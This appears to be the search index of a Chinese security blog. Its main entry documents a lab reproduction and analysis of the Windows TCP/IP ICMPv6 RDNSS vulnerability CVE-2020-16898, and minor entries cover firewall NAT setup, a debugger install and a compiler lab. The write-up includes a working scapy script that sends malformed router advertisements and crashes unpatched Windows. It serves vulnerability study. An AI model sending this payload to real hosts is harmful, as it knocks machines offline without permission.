<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2020-16898调试复现记录</title>
      <link href="/2020/11/10/cve-2020-16898-diao-shi-fu-xian-ji-lu/"/>
      <url>/2020/11/10/cve-2020-16898-diao-shi-fu-xian-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><ul><li><p>物理机：Windows 10 + windbg</p></li><li><p>虚拟机：Windows 10 1909版本</p></li><li><p>反编译：IDA</p></li></ul><h2 id="配置虚拟机"><a href="#配置虚拟机" class="headerlink" title="配置虚拟机"></a>配置虚拟机</h2><p>由于我的本地环境win10中启用了hyper-v,在vmware 16.x中安装Windows 10  1709版本开启debug后会有冲突，会造成假死，所以使用了Windows 10 1909版本 </p><p>在win10系统中复制一个启动项，并且打开调试模式。代码如下</p><pre><code>bcdedit /dbgsettings serial baudrate:115200 debugport:1bcdedit /copy {current} /d DebugEntrybcdedit /displayorder {current} {ID}bcdedit /debug {ID} ONbcdedit /set {default} bootmenupolicy legacy</code></pre><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110194402977.png" alt="image-20201110194402977"></p><p>vmware中打开IPV6，同时添加一个调试串口。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110195236313.png" alt="image-20201110195236313"></p><p>设置管道 <code>\\.\pipe\com_1</code></p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110195437003.png" alt="image-20201110195437003"></p><p>设置网络为NAT模式，VMnet8</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110195547560.png" alt="image-20201110195547560"></p><h2 id="配置windbg"><a href="#配置windbg" class="headerlink" title="配置windbg"></a>配置windbg</h2><p>不同版本的windbg使用不同的配置方式</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110200043264.png" alt="image-20201110200043264"></p><p>配置符号</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110200331013.png" alt="image-20201110200331013"></p><p>旧版本的windbg需要在桌面创建快捷方式，在后面添加参数。</p><p><code>-b -k com:pipe,port=\\.\pipe\com_1,resets=0,reconnect -y</code></p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110200849555.png" alt="image-20201110200849555"></p><h1 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h1><p>开始调试，设置reconnet，等待win10开机。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110201410605.png" alt="image-20201110201410605"></p><p>win10开机后，windbg处于调试运行状态，此时切换到kali中运行exp。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>all <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>layers<span class="token punctuation">.</span>inet6 <span class="token keyword">import</span> ICMPv6NDOptEFA<span class="token punctuation">,</span> ICMPv6NDOptRDNSS<span class="token punctuation">,</span> ICMPv6ND_RA<span class="token punctuation">,</span> IPv6<span class="token punctuation">,</span> IPv6ExtHdrFragment<span class="token punctuation">,</span> fragment6v6_dst <span class="token operator">=</span> <span class="token string">"fd15:4ba5:5a2b:1008:34b0:3a5d:3646:3313"</span>v6_src <span class="token operator">=</span> <span class="token string">"fd15:4ba5:5a2b:1008:351e:f5f7:5804:d271"</span>p_test_half <span class="token operator">=</span> <span class="token string">'A'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> b<span class="token string">"\x18\x30"</span> <span class="token operator">+</span> b<span class="token string">"\xFF\x18"</span>p_test <span class="token operator">=</span> p_test_half <span class="token operator">+</span> <span class="token string">'A'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span>c <span class="token operator">=</span> ICMPv6NDOptEFA<span class="token punctuation">(</span><span class="token punctuation">)</span>e <span class="token operator">=</span> ICMPv6NDOptRDNSS<span class="token punctuation">(</span><span class="token punctuation">)</span>e<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">21</span>e<span class="token punctuation">.</span>dns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:FFFF:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span> <span class="token punctuation">]</span>aaa <span class="token operator">=</span> ICMPv6NDOptRDNSS<span class="token punctuation">(</span><span class="token punctuation">)</span>aaa<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">8</span>pkt <span class="token operator">=</span> ICMPv6ND_RA<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> aaa <span class="token operator">/</span> \      Raw<span class="token punctuation">(</span>load<span class="token operator">=</span><span class="token string">'A'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p_test_half <span class="token operator">+</span> b<span class="token string">"\x18\xa0"</span><span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">/</span> c <span class="token operator">/</span> e <span class="token operator">/</span> c <span class="token operator">/</span> e <span class="token operator">/</span> c <span class="token operator">/</span> e <span class="token operator">/</span> c <span class="token operator">/</span> e <span class="token operator">/</span> c <span class="token operator">/</span> e <span class="token operator">/</span> e <span class="token operator">/</span> e <span class="token operator">/</span> e <span class="token operator">/</span> e <span class="token operator">/</span> e <span class="token operator">/</span> ep_test_frag <span class="token operator">=</span> IPv6<span class="token punctuation">(</span>dst<span class="token operator">=</span>v6_dst<span class="token punctuation">,</span> src<span class="token operator">=</span>v6_src<span class="token punctuation">,</span> hlim<span class="token operator">=</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token operator">/</span> \              IPv6ExtHdrFragment<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">/</span>pktl<span class="token operator">=</span>fragment6<span class="token punctuation">(</span>p_test_frag<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token keyword">for</span> p <span class="token keyword">in</span> l<span class="token punctuation">:</span>    send<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改exp中的源地址和目标地址，源地址修改为kali的ipv6地址。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110224712749.png" alt="image-20201110224712749"></p><p>修改目标地址</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110225345566.png" alt="image-20201110225345566"></p><p>运行后win10假死状态，windbg中断，可以发现发生了异常，使用!analyze -v运行分析。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110223459821.png" alt="image-20201110223459821"></p><p>发现了错误的位置 <code>tcpip!_report_gsfailure</code></p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110225721871.png" alt="image-20201110225721871"></p><p>输入kv 显示当前线程的堆栈，发现了两个有问题的堆栈位置。可以在ida中进行继续分析。crash原因的是GS机制的Security Cookie校验失败。</p><pre><code>07 fffff803`0f899108 fffff803`0f11b197 tcpip!_report_gsfailure+0x508 fffff803`0f899110 aaaaaaaa`aaaaaaaa tcpip!Ipv6pHandleRouterAdvertisement+0x10ef</code></pre><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110225901670.png" alt="image-20201110225901670"></p><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><p><a href="https://tools.ietf.org/html/rfc8106#section-5.3.1" target="_blank" rel="noopener">RFC 8106</a> 协议报文如下：</p><pre><code>0                   1                   2                   30 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|     Type      |     Length    |           Reserved            |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                           Lifetime                            |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                                                               |:            Addresses of IPv6 Recursive DNS Servers            :|                                                               |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre><p>原文如下：</p><blockquote><pre><code>      The validity of DNS options is checked with the Length field;      that is, the value of the Length field in the RDNSS option is      greater than or equal to the minimum value (3) and satisfies the      requirement that (Length - 1) % 2 == 0.  The value of the Length      field in the DNSSL option is greater than or equal to the minimum      value (2).  Also, the validity of the RDNSS option is checked with      the &quot;Addresses of IPv6 Recursive DNS Servers&quot; field; that is, the      addresses should be unicast addresses.</code></pre></blockquote><p>几个比较重要的点是：</p><blockquote><ul><li><strong>Type（1个字节）</strong>：RDNSS选项类型的类型为 25（0x19）</li><li><strong>Length（1个字节）</strong>：如果该选项中包含一个 IPv6 地址，则长度取最小值3 。每增加一个 RDNSS 地址，长度就会增加2。接收器使用“长度”字段来确定选项中IPv6地址的数量</li><li><strong>Addresses of IPv6 Recursive DNS Servers（可变长度，由“Length”字段确定）</strong>：一个或多个递归DNS服务器的 128 位 IPv6 地址 。地址个数为（Length - 1）/ 2</li></ul></blockquote><p>下面引用一段其他博客的分析：</p><blockquote><p>根据上面的描述，可以得到 <code>(Length - 1) % 2 == 0</code> 这个条件，所以 length必须是大于等于3的奇数。</p><p>假设此时 length 长度为 3， 则地址个数为 （3 - 1) / 2 == 1 ，我们知道一个地址长度为 16 字节。IPv6 Recursive DNS Servers 地址前的字段占 8 字节，每个 IPv6 Recursive DNS Servers 地址长度为 16 个字节，所以正常的 RDNSS 选项总长度应满足 16x+8（x&gt;=1），将其除以 8 就是 2x+1（x&gt;=1） ，也就是 Length 字段应该满足的条件。由于 IPv6 RDNSS 地址为 16 个字节，所以 RDNSS 选项总长度会以 16 字节递增，一个最小的长度为 24（8+16）</p></blockquote><p>查询微软的docs关于<code>NdisGetDataBuffer</code>函数的相关信息。</p><pre class="line-numbers language-c++"><code class="language-c++">PVOID NdisGetDataBuffer(  PNET_BUFFER NetBuffer,  //指向NET_BUFFER结构的指针.  ULONG       BytesNeeded, // [输入]请求的数据的连续字节数。  PVOID       Storage,  // [in，可选]指向缓冲区的指针，如果调用者未提供缓冲区，则为NULL。缓冲区的大小必须大于或等于BytesNeeded中指定的字节数 。如果该值为非NULL，并且请求的数据不连续，则NDIS将请求的数据复制到Storage指示的区域 。  UINT        AlignMultiple, // [in]对齐倍数，以2的幂表示。例如2、4、8、16等。如果 AlignMultiple为1，则没有对齐要求。  UINT        AlignOffset  // [in]与对齐倍数的偏移量（以字节为单位）。);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p> <strong>返回值</strong></p><p> <strong>NdisGetDataBuffer</strong>返回一个指向连续数据开始的指针，或者返回<strong>NULL</strong>。</p><p> 如果<em>NetBuffer</em> 参数指向的<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/ns-ndis-_net_buffer_data" target="_blank" rel="noopener">NET_BUFFER</a>结构中 <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/ns-ndis-_net_buffer" target="_blank" rel="noopener">NET_BUFFER_DATA</a>结构的 <strong>DataLength</strong>成员 小于 <em>BytesNeeded</em>参数中的值，则返回值为<strong>NULL</strong>。</p><p> 如果缓冲区中请求的数据是连续的，则返回值是指向NDIS提供的位置的指针。如果数据不连续，则NDIS使用 <em>Storage</em>参数如下：</p><ul><li><p>如果 <em>Storage</em>参数为非<strong>NULL</strong>，则NDIS将数据复制到<em>Storage</em>的缓冲区中 。返回值是传递给<em>Storage</em>参数的指针 。</p></li><li><p>如果 <em>Storage</em>参数为<strong>NULL</strong>，则返回值为<strong>NULL</strong>。</p><p>由于无法映射数据缓冲区的资源不足情况， 返回值也可以为<strong>NULL</strong>。即使数据是连续的或<em>Storage</em>参数为非<strong>NULL，</strong>也可能会发生这种情况。</p></li></ul></blockquote><p>_NET_BUFFER 结构如下：</p><pre class="line-numbers language-c++"><code class="language-c++">typedef struct _NET_BUFFER { //NET_BUFFER结构指定通过网络发送或接收的数据。  union {    struct {      PNET_BUFFER Next; // 指向NET_BUFFER结构的链表中的下一个NET_BUFFER结构的指针。如果此结构是列表中的最后一个NET_BUFFER结构，则此成员为NULL。      PMDL        CurrentMdl; // 指向当前驱动程序正在使用的第一个MDL的指针。该成员提供了一种优化，它可以跳过当前驱动程序未使用的任何MDL，从而提高性能。      ULONG       CurrentMdlOffset; // 由CurrentMdl成员指定的MDL中已使用数据空间开头的偏移量（以字节为单位）。      union {        ULONG  DataLength; // 指向NET_BUFFER结构的链表中的下一个NET_BUFFER结构的指针。如果此结构是列表中的最后一个NET_BUFFER结构，则此成员为NULL。        SIZE_T stDataLength; // MDL链中已用数据空间的长度（以字节为单位）。最大长度为0xFFFFFFFF字节。该成员与DataLength相同，但其类型为SIZE_T而不是ULONG。      };      PMDL        MdlChain; // 指向映射数据缓冲区的MDL链接列表的指针。数据缓冲区存储网络数据。      ULONG       DataOffset; //从MDL链的起点到MDL链中的网络数据的起点的偏移量（以字节为单位）。此偏移量也是未使用的数据空间的大小（以字节为单位）。    };    SLIST_HEADER      Link;    NET_BUFFER_HEADER NetBufferHeader;  };  USHORT                ChecksumBias;  USHORT                Reserved;  NDIS_HANDLE           NdisPoolHandle;  PVOID                 NdisReserved[2];  PVOID                 ProtocolReserved[6];  PVOID                 MiniportReserved[4];  NDIS_PHYSICAL_ADDRESS DataPhysicalAddress;  union {    PNET_BUFFER_SHARED_MEMORY SharedMemoryInfo;    PSCATTER_GATHER_LIST      ScatterGatherList;  };} NET_BUFFER, *PNET_BUFFER;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>NET_BUFFER_DATA</code>的结构如下：</p><pre class="line-numbers language-c++"><code class="language-c++">typedef struct _NET_BUFFER_DATA {  PNET_BUFFER            Next; //指向NET_BUFFER结构的链表中的下一个NET_BUFFER结构的指针。如果此结构是列表中的最后一个NET_BUFFER结构，则此成员为NULL。  PMDL                   CurrentMdl; // 指向当前驱动程序正在使用的第一个MDL的指针。该成员提供了一种优化，它可以跳过当前驱动程序未使用的任何MDL，从而提高性能。  ULONG                  CurrentMdlOffset; // 由CurrentMdl成员指定的MDL中已 使用数据空间开头的偏移量（以字节为单位） 。  NET_BUFFER_DATA_LENGTH NbDataLength; // MDL链中已用数据空间的长度（以字节为单位）。最大长度为0xFFFFFFFF字节。  PMDL                   MdlChain; // 指向映射数据缓冲区的MDL链接列表的指针。数据缓冲区存储网络数据。  ULONG                  DataOffset; // 从MDL链的起点到MDL链中的网络数据的起点的偏移量（以字节为单位）。此偏移量也是未使用的数据空间的大小（以字节为单位） 。} NET_BUFFER_DATA, *PNET_BUFFER_DATA;该 NET_BUFFER_HEADER结构包含一个NET_BUFFER_DATA结构，对于定义数据 NET_BUFFER结构。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="IDA-分析"><a href="#IDA-分析" class="headerlink" title="IDA 分析"></a>IDA 分析</h1><p>使用ida加载tcpip.sys，将tcpip.pdb文件放在同目录，ida即可自动进行加载这个符号文件。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201113194836750.png" alt="image-20201113194836750"></p><p>在funtion窗口中搜索<code>Ipv6pHandleRouterAdvertisement</code>，根据崩溃的位置，从这里开始进行分析。根据上图的堆栈，由于</p><blockquote><p>08 fffff803 0f899110 aaaaaaaa aaaaaaaa tcpip!Ipv6pHandleRouterAdvertisement+0x10ef</p></blockquote><p>这条堆栈，所以一定是Ipv6pHandleRouterAdvertisement函数触发了GS的检查，因为是进行GS检查后才进行pop出去返回地址，由这里可以继续分析。</p><p><code>Ipv6pHandleRouterAdvertisement</code>函数存在两个循环，第一个循环遍历所有headers，做一些基本的验证，如length的大小，第二个循环用于处理包，并且该阶段不再验证。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201113232618155.png" alt="image-20201113232618155"></p><p>结合其他的分析文档以及使用windbg下断点分析，可以确定<code>Ipv6pHandleRouterAdvertisement</code>函数为发生溢出的函数。</p><p>继续分析可知是由于<code>Ipv6pUpdateRDNSS</code>函数造成的。确切原因是当length字段为偶数时，<code>Ipv6pUpdateRDNSS</code>函数未按预期调整网络缓冲区指针。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201113202559941.png" alt="image-20201113202559941"></p><h2 id="分析漏洞函数"><a href="#分析漏洞函数" class="headerlink" title="分析漏洞函数"></a>分析漏洞函数</h2><p>第一个循环中判断的case：</p><p>根据上面的资料可以发现如果Length是偶数，就会发生问题，假设<code>Length</code>的长度为4，那么计算结束之后，<code>AddressCount</code>的值应该为1。此时，按照正常逻辑，<code>Ipv6pUpdateRDNSS()</code>函数应该增加32字节（4*8）的缓冲区，但是后续在分配缓冲区时只分配了24字节：<code>sizeof(ND_OPTION_RDNSS) + sizeof(IN6_ADDR) = 8 + 16 = 24</code>，从而导致了溢出。</p><p>继续分析</p><p>有了上述的结构，继续分析Ipv6pUpdateRDNSS函数。由上述资料可以得到 NdisGetDataBuffer 返回了RDNSS option的结构指针，该结构+1字节以后正是Length的地址，后根据公式计算出有多少个地址。 </p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201113222439361.png" alt="image-20201113222439361"></p><p>通过交叉引用可以分析出v37 是下面while的次数。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201113222900308.png" alt="image-20201113222900308"></p><p>下面开始进入了while的循环</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201113223905055.png" alt="image-20201113223905055"></p><p>总结上述过程，<code>Ipv6pHandleRouterAdvertisement</code>中的第一个判断 Packet的循环认为Options应该是 4*8 = 0x20偏移，但Ipv6pUpdateRDNSS() 认为下一个Options在0x18处 执行结束后 从0x18处 读取 Options 这里是没有经过Packet安全校验的 可以任意调用模块功能 并且如果Packet是分包 内容不在一个包里 读取到其他内容 也会把数据复制到 参数3里 才导致的这个问题 本质是 Ipv6pUpdateRDNSS 计算错误了</p><p>如果没有其他漏洞配合，CVE-2020-16898是无法直接造成RCE的。</p><h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><p>使用wireshark分析流量包。type为0x19 对应了上面分析时确定的case，length为偶数，可以观察到Recursive DNS Servers解析是错误的。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201114011222194.png" alt="image-20201114011222194"></p><p>明显的观察到解析已经出错了，本应作为下一个开头的icmp包出现了错误。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201114011531014.png" alt="image-20201114011531014"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CVE-2020-16898 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN练习记录</title>
      <link href="/2020/11/03/pwn-lian-xi-ji-lu/"/>
      <url>/2020/11/03/pwn-lian-xi-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="2020年11月3日-练习记录"><a href="#2020年11月3日-练习记录" class="headerlink" title="2020年11月3日 练习记录"></a>2020年11月3日 练习记录</h1>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>飞塔防火墙配置将内网ip映射到外网</title>
      <link href="/2020/11/03/fei-ta-fang-huo-qiang-pei-zhi-jiang-nei-wang-ip-ying-she-dao-wai-wang/"/>
      <url>/2020/11/03/fei-ta-fang-huo-qiang-pei-zhi-jiang-nei-wang-ip-ying-she-dao-wai-wang/</url>
      
        <content type="html"><![CDATA[<h2 id="配置网卡"><a href="#配置网卡" class="headerlink" title="配置网卡"></a>配置网卡</h2><p><img src="%E9%A3%9E%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E5%B0%86%E5%86%85%E7%BD%91ip%E6%98%A0%E5%B0%84%E5%88%B0%E5%A4%96%E7%BD%91.assets/Image(1).png" alt="Image(1)"></p><pre><code>启动以后重设密码execute factoryresetshow system interfaceconfig system interfaceedit port1set mode staticset ip 192.168.93.99 255.255.255.0   nat的其中一个地址end此时即可开启web登录</code></pre><h2 id="配置WAN"><a href="#配置WAN" class="headerlink" title="配置WAN"></a>配置WAN</h2><p><img src="%E9%A3%9E%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E5%B0%86%E5%86%85%E7%BD%91ip%E6%98%A0%E5%B0%84%E5%88%B0%E5%A4%96%E7%BD%91.assets/Image.png" alt="Image"></p><h2 id="配置LAN"><a href="#配置LAN" class="headerlink" title="配置LAN"></a>配置LAN</h2><p><img src="%E9%A3%9E%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E5%B0%86%E5%86%85%E7%BD%91ip%E6%98%A0%E5%B0%84%E5%88%B0%E5%A4%96%E7%BD%91.assets/Image%20%5B2%5D.png" alt="Image [2]"></p><p>配置映射内网ip到外网，先配置虚拟ip</p><p><img src="%E9%A3%9E%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E5%B0%86%E5%86%85%E7%BD%91ip%E6%98%A0%E5%B0%84%E5%88%B0%E5%A4%96%E7%BD%91.assets/Image%20%5B3%5D.png" alt="Image [3]"></p><h2 id="配置防火墙策略"><a href="#配置防火墙策略" class="headerlink" title="配置防火墙策略"></a>配置防火墙策略</h2><p><img src="%E9%A3%9E%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E5%B0%86%E5%86%85%E7%BD%91ip%E6%98%A0%E5%B0%84%E5%88%B0%E5%A4%96%E7%BD%91.assets/Image%20%5B4%5D.png" alt="Image [4]"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Affinic Debugger for GDB 安装注册过程</title>
      <link href="/2020/01/31/affinic-debugger-for-gdb-an-zhuang-zhu-ce-guo-cheng/"/>
      <url>/2020/01/31/affinic-debugger-for-gdb-an-zhuang-zhu-ce-guo-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="Affinic-Debugger"><a href="#Affinic-Debugger" class="headerlink" title="Affinic Debugger"></a>Affinic Debugger</h1><p>Affinic Debugger，.aka。ADG旨在成为各种调试器的日常图形用户界面（GUI）。此构建专门针对GDB，GNU调试器和LLDB，LLVM调试器。通过图形窗口，ADG可以通过在一个视图中查看多个信息，然后单击轻松进行调试，从而释放您正在使用的调试器的全部功能。ADG还提供了一个独特的集成命令终端，供用户直接输入调试器命令以完成在文本模式下可以执行的任何任务。ADG在Linux / Windows / Mac OS X上可用。</p><p>Affinic Debugger的目标是为任何类型的用户提供最佳的调试体验。它试图通过直观的界面提供超快的速度，以操纵代码和大量数据以帮助分析。ADG提供了其他IDE无法做到的功能，例如GDB / LLDB终端，程序集调试，远程调试，反汇编，内存更新和线程调试等。ADG是一个不断发展的产品。欢迎您提供反馈意见，以帮助它变得更好，更强大。只需给我们发送电子邮件。</p><p><strong>就是一款GUI的调试器，用的是GDB或者LLDB作为后端。</strong></p><p>官方地址： <a href="http://www.affinic.com/?page_id=109" target="_blank" rel="noopener">http://www.affinic.com/?page_id=109</a></p><h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><p>分为Windows 版本和Linux 版本，</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> gdb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> Affinic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMP授权keygen分析</title>
      <link href="/2020/01/11/vmp-shou-quan-keygen-fen-xi/"/>
      <url>/2020/01/11/vmp-shou-quan-keygen-fen-xi/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> VMP </tag>
            
            <tag> keygen </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tiny 实验报告</title>
      <link href="/2020/01/11/tiny-shi-yan-bao-gao/"/>
      <url>/2020/01/11/tiny-shi-yan-bao-gao/</url>
      
        <content type="html"><![CDATA[<h1 id="实验报告"><a href="#实验报告" class="headerlink" title="实验报告"></a>实验报告</h1><h2 id="分析该语言的词法和语法规则，分析其编译器的运行命令和代码组成结构"><a href="#分析该语言的词法和语法规则，分析其编译器的运行命令和代码组成结构" class="headerlink" title="分析该语言的词法和语法规则，分析其编译器的运行命令和代码组成结构"></a>分析该语言的词法和语法规则，分析其编译器的运行命令和代码组成结构</h2><h3 id="词法规则"><a href="#词法规则" class="headerlink" title="词法规则"></a>词法规则</h3><p>下面是LEX中的变量声明</p><p>定义段可以包含任意的C语言文件，符号说明，其代码会被直接拷贝到生成的扫描器代码文件中</p><p>声明示例如下</p><blockquote><p>%{</p><p>…</p><p>%}</p></blockquote><pre><code>digit       [0-9]number      {digit}+letter      [a-zA-Z]identifier  {letter}+newline     \nwhitespace  [ \t]+</code></pre><p>下面是一些关键字，规则段利用正则表达式来匹配模式，每当成功匹配一个模式，就对应其后“{ }” 中的代码。</p><p>语法规则示例如下</p><blockquote><p>%%</p><p>…</p><p>%%</p></blockquote><pre class="line-numbers language-c++"><code class="language-c++">"if"            {return IF;}"then"          {return THEN;}"else"          {return ELSE;}"end"           {return END;}"repeat"        {return REPEAT;}"until"         {return UNTIL;}"read"          {return READ;}"write"         {return WRITE;}":="            {return ASSIGN;}"="             {return EQ;}"<"             {return LT;}"+"             {return PLUS;}"-"             {return MINUS;}"*"             {return TIMES;}"/"             {return OVER;}"("             {return LPAREN;}")"             {return RPAREN;}";"             {return SEMI;}{number}        {return NUM;}{identifier}    {return ID;}{newline}       {lineno++;}{whitespace}    {/* skip whitespace */}"{"             { char c;                  do                  { c = input();                    if (c == EOF) break;  